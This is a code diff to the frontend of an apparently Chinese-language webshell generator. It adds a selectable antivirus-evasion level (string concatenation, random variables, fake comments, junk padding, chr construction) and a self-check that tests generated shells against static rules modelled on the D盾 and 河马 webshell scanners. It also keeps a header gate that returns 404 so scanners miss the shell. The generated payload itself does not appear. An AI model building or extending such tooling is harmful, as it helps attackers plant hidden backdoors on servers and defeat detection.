@@ -198,7 +198,8 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
   const [pwd, setPwd] = React.useState("");
   const [gateHeader, setGateHeader] = React.useState("");
   const [gateValue, setGateValue] = React.useState("");
-  const [evasive, setEvasive] = React.useState(false);
+  const [evasiveLevel, setEvasiveLevel] = React.useState(0);
+  const [check, setCheck] = React.useState<{ checked: number; leaked: { name: string }[]; passed: boolean } | null>(null);
   const [gen, setGen] = React.useState<{ path: string; code: string; size: number } | null>(null);
   const [busy, setBusy] = React.useState(false);
   const [copied, setCopied] = React.useState(false);
@@ -207,7 +208,12 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
     if (!pwd.trim()) return void window.alert("密码必填");
     setBusy(true);
     try {
-      const r = await api.wsGenerate({ script_type: st, encoder: enc, password: pwd, gate_header: gateHeader, gate_value: gateValue, evasive });
+      const r = await api.wsGenerate({
+        script_type: st, encoder: enc, password: pwd,
+        gate_header: gateHeader, gate_value: gateValue,
+        evasive: evasiveLevel > 0, evasive_level: evasiveLevel,
+      });
+      setCheck(r.data?.self_check || null);
       setGen(r.data);
     } catch (e) {
       window.alert("生成失败: " + (e instanceof Error ? e.message : String(e)));
@@ -236,8 +242,13 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
             <Input placeholder="Gate 值（缺头 404）" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
           </div>
           <label className="flex items-center gap-1.5 text-xs">
-            <input type="checkbox" checked={evasive} onChange={(e) => setEvasive(e.target.checked)} />
-            免杀变形（函数名拼接/变量随机/伪装注释——明文无 eval/base64_decode 等特征）
+            {"免杀等级："}
+            <span className="flex gap-1">
+              {[{ v: 0, label: "无" }, { v: 1, label: "标准" }, { v: 2, label: "深度" }].map((o) => (
+                <button key={o.v} className={`rounded border px-2 py-0.5 ${evasiveLevel === o.v ? "border-blue-500 bg-blue-500/10 font-semibold" : "hover:bg-muted/50"}`} onClick={() => setEvasiveLevel(o.v)}>{o.label}</button>
+              ))}
+            </span>
+            <div className="text-[10px] opacity-70">标准=拼接/随机变量/伪装注释/include 链；深度=+垃圾膨胀/等价 API 替换/chr 构造。</div>
           </label>
           <div className="text-[11px] text-muted-foreground">
             Header Gate：缺校验头直接 404，对抗扫描器。连接目标时把同名头写进「附加头 JSON」。
@@ -251,7 +262,14 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
                   {copied ? "已复制 ✓" : "复制代码"}
                 </Button>
               </div>
-              <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-zinc-900 p-2 font-mono text-[11px] text-zinc-200">{gen.code}</pre>
+              {check && (
+              <div className={`rounded border p-2 text-xs ${check.passed ? "border-green-500/50 bg-green-500/10 text-green-600" : "border-red-500/50 bg-red-500/10 text-red-500"}`}>
+                <div className="font-semibold">{check.passed ? "✓ 特征自检通过" : "✗ 特征命中"}（{check.checked} 条静态规则：eval/assert/base64_decode/system/$_POST…）</div>
+                {!check.passed && <div>命中：{check.leaked.map((l) => l.name).join("、")}</div>}
+                <div className="text-[10px] opacity-70">本地静态检测（模拟 D 盾/河马类规则），不上传任何数据。</div>
+              </div>
+            )}
+            <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-zinc-900 p-2 font-mono text-[11px] text-zinc-200">{gen.code}</pre>
             </div>
           )}
         </CardContent>
